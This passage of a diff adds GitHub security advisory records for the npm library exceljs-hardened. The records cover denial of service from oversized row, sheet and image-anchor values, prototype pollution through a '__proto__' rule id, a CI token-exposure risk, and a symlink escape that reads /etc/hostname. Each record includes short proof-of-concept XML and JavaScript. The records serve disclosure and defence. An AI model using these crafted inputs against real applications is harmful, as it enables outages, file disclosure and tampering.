+      "ghsa_id": "GHSA-cqmf-h7c5-g7xx",
+      "cve_id": "CVE-2026-128344",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-cqmf-h7c5-g7xx",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-cqmf-h7c5-g7xx",
+      "summary": "Memory exhaustion through a huge image anchor",
+      "description": "### Summary\r\n\r\nA workbook with an image anchored at a very large column crashes the process when the application reads the image position.\r\n\r\n\r\n### Details\r\n\r\nAnchor coordinates are read from the drawing without bounds. Computing the column position of an anchor walks the column list up to that index and allocates the missing columns.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/drawings/drawing1.xml` of a workbook containing an image:\r\n\r\n```xml\r\n<xdr:from><xdr:col>300000000</xdr:col> … </xdr:from>\r\n```\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);              // 12 ms\r\n\r\nwb.getWorksheet('S').getImages()[0].range.tl.col;\r\n// FATAL ERROR: ... JavaScript heap out of memory\r\n```\r\n\r\nWith `3000000`, the same read takes about 0.5 s and 640 MB of memory.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service when the application reads image positions, which is the standard way to extract images from a workbook. The abort is a fatal V8 error that `try/catch` cannot handle.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-cqmf-h7c5-g7xx",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128344",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:54:29Z",
+      "published_at": "2026-10-16T16:05:57Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-3gm5-qxj8-89rr",
+      "cve_id": "CVE-2026-128343",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-3gm5-qxj8-89rr",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-3gm5-qxj8-89rr",
+      "summary": "Event loop blocking through huge row numbers",
+      "description": "### Summary\r\n\r\nA workbook with a row numbered far beyond Excel's limit loads instantly, then makes every pass over the sheet slow.\r\n\r\n\r\n### Details\r\n\r\nRows are stored in a sparse array indexed by the `r` attribute. Reading values, writing the workbook or exporting to CSV all iterate up to the largest row number. Excel's maximum is 1,048,576.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/worksheets/sheet1.xml` of any valid workbook:\r\n\r\n```xml\r\n<row r=\"20000000\"><c r=\"A20000000\"><v>1</v></c></row>\r\n```\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);              // 12 ms\r\n\r\nwb.getWorksheet('S').getSheetValues();   // 0.6 s\r\nawait wb.xlsx.writeBuffer();             // 1.2 s\r\nawait wb.csv.writeBuffer();              // 6.2 s\r\n```\r\n\r\nThe cost is linear in the row number.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service: the event loop is blocked for the duration of each pass, and the delay grows with the row number chosen by the attacker.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-3gm5-qxj8-89rr",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128343",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:53:59Z",
+      "published_at": "2026-10-16T16:05:44Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-9vv6-5g3h-prg5",
+      "cve_id": "CVE-2026-128342",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-9vv6-5g3h-prg5",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-9vv6-5g3h-prg5",
+      "summary": "Event loop blocking through a huge worksheet id",
+      "description": "### Summary\r\n\r\nA workbook with a very large `sheetId` loads instantly, then blocks the event loop for seconds each time the worksheets are accessed or the workbook is written.\r\n\r\n\r\n### Details\r\n\r\nWorksheets are stored in a sparse array indexed by their `sheetId`. Every access that walks the array (`worksheets`, `getWorksheet(name)`, `writeBuffer()`) costs time proportional to the largest id.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/workbook.xml` of any valid workbook:\r\n\r\n```xml\r\n<sheet name=\"S\" sheetId=\"100000000\" r:id=\"rId1\"/>\r\n```\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);        // 12 ms\r\n\r\nwb.worksheets;                     // blocks for about 11 s\r\nawait wb.xlsx.writeBuffer();       // blocks for about 21 s\r\n```\r\n\r\nThe cost grows linearly with the id, up to the 32-bit limit.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service: the process serves no other request while it walks the array. The block is triggered by ordinary use of the loaded workbook, not by any unusual call.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-9vv6-5g3h-prg5",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128342",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:53:31Z",
+      "published_at": "2026-10-16T16:05:28Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-86ch-m4gp-r5xf",
+      "cve_id": "CVE-2026-128337",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-86ch-m4gp-r5xf",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-86ch-m4gp-r5xf",
+      "summary": "Prototype pollution through a conditional formatting extension id",
+      "description": "### Summary\r\n\r\nLoading a crafted `.xlsx` pollutes `Object.prototype` for the whole Node.js process, with attacker-chosen string values on common property names. No authentication is needed beyond submitting a file to an application that calls `xlsx.load()`.\r\n\r\n\r\n### Details\r\n\r\nConditional formatting rules and their `x14` extensions are matched through plain objects keyed by values read from the file (the rule id and the range).\r\n\r\nWith the id `__proto__`, the lookup returns `Object.prototype`, and the merge step copies every property of the extension rule onto it.\r\n\r\n\r\n### Proof of concept\r\n\r\nCreate a workbook with a `dataBar` conditional formatting, then set the `id` of its `<x14:cfRule>` in `xl/worksheets/sheet1.xml` to `__proto__`:\r\n\r\n```xml\r\n<x14:cfRule type=\"dataBar\" id=\"__proto__\">…</x14:cfRule>\r\n```\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);\r\n\r\nObject.keys(Object.prototype);\r\n// [ 'type', 'x14Id', 'cfvo', 'minLength', 'maxLength', 'border', 'gradient',\r\n//   'negativeBarColorSameAsPositive', 'negativeBarBorderColorSameAsPositive',\r\n//   'axisPosition', 'direction' ]\r\n\r\n({}).type;   // 'dataBar'\r\n```\r\n\r\n\r\n### Impact\r\n\r\nEvery object in the process inherits these properties, with values chosen by the attacker. Names such as `type`, `direction` or `border` are used by many libraries, so application logic can be altered until the process restarts.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-86ch-m4gp-r5xf",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128337",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:48:32Z",
+      "published_at": "2026-10-16T16:05:09Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N",
+          "score": 8.8
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1321"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-g2wv-vg24-p797",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-g2wv-vg24-p797",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-g2wv-vg24-p797",
+      "summary": "CI workflow uses a third-party action pinned by tag with default token permissions",
+      "description": "### Summary\r\n\r\nThe asset-size workflow runs a third-party action referenced by a mutable tag, passes it the repository token, and declares no `permissions` block.\r\n\r\n\r\n### Details\r\n\r\n```yaml\r\non: [pull_request]\r\n\r\nsteps:\r\n  - uses: actions/checkout@v2\r\n  - uses: chrysanthos/simple-asset-size-reporter@1.0.2\r\n    with:\r\n      repo-token: \"${{ secrets.GITHUB_TOKEN }}\"\r\n```\r\n\r\nA tag can be moved to another commit, so the code that receives the token is not fixed. Without a `permissions` block, the token gets the repository's default permissions.\r\n\r\n\r\n### Proof of concept\r\n\r\nThe action is resolved by tag when the job runs:\r\n\r\n```sh\r\ngit ls-remote https://github.com/chrysanthos/simple-asset-size-reporter refs/tags/1.0.2\r\n```\r\n\r\nThis prints whichever commit the tag points to at that moment. The owner of the action can move the tag to a commit that reads `INPUT_REPO-TOKEN`, and the next pull request run executes it with the repository token.\r\n\r\nBecause the workflow has no `permissions` block, that token carries the repository's default scopes, which may include write access.\r\n\r\n\r\n### Impact\r\n\r\nIf the action's repository is compromised or its tag is retargeted, the code runs in the project's CI with the repository token. Runs triggered by pull requests from forks only get a read-only token. The published package is not affected.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-g2wv-vg24-p797",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:04:19Z",
+      "published_at": "2026-10-16T16:04:19Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-250",
+          "name": "Execution with Unnecessary Privileges"
+        },
+        {
+          "cwe_id": "CWE-829",
+          "name": "Inclusion of Functionality from Untrusted Control Sphere"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-250",
+        "CWE-829"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-vw24-mphq-4jvh",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-vw24-mphq-4jvh",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-vw24-mphq-4jvh",
+      "summary": "`safeJoin` follows symbolic links out of the base directory",
+      "description": "### Summary\r\n\r\n`utils.safeJoin(baseDir, userPath)` rejects `..` traversal but accepts a path that goes through a symbolic link pointing outside `baseDir`.\r\n\r\n\r\n### Details\r\n\r\nThe containment check compares the lexical paths only. It does not resolve symbolic links, so a link located inside the base directory is treated as being inside it, wherever it points.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nfs.mkdirSync('/srv/assets');\r\nfs.symlinkSync('/etc/hostname', '/srv/assets/link.png');\r\n\r\nExcelJS.utils.safeJoin('/srv/assets', 'link.png');\r\n// '/srv/assets/link.png'  (accepted)\r\n```\r\n\r\nPassing that path to `addImage({ filename })` embeds the content of `/etc/hostname` in the workbook.\r\n\r\n\r\n### Impact\r\n\r\nDisclosure of local files readable by the process, when an attacker can create a symbolic link under the base directory (extracted archives, shared or uploaded folders).\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-vw24-mphq-4jvh",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:04:07Z",
+      "published_at": "2026-10-16T16:04:07Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory"
+        },
+        {
+          "cwe_id": "CWE-59",
+          "name": "Improper Link Resolution Before File Access"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-4h28-922h-3f38",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-4h28-922h-3f38",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-4h28-922h-3f38",
+      "summary": "CSV import resolves cell values through the prototype chain",
